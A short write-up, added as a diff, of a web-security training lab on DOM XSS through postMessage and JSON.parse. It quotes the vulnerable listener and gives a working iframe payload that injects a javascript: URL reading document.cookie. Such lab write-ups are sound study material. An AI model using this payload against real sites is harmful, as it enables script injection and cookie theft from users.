@@ -1,0 +1,34 @@
+DOM XSS using web messages and JSON.parse
+
+Inspecting the page source, we can find a script:
+
+<script>
+    window.addEventListener('message', function(e) {
+        var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
+        document.body.appendChild(iframe);
+        try {
+            d = JSON.parse(e.data);
+        } catch(e) {
+            return;
+        }
+        switch(d.type) {
+            case "page-load":
+                ACMEplayer.element.scrollIntoView();
+                break;
+            case "load-channel":
+                ACMEplayer.element.src = d.url;
+                break;
+            case "player-height-changed":
+                ACMEplayer.element.style.width = d.width + "px";
+                ACMEplayer.element.style.height = d.height + "px";
+                break;
+        }
+    }, false);
+</script>
+
+Essentially, this script waits for a message, parses it as a JSON and passes the result to a switch (a switch will pick the option that fits from more than one. It's like a stronger if).
+
+Our payload:
+<iframe src=https://ac171f061f7180628058893900e50076.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:alert(document.cookie)\"}","*")'> 
+
+The lab solution explains how the payload works very well.
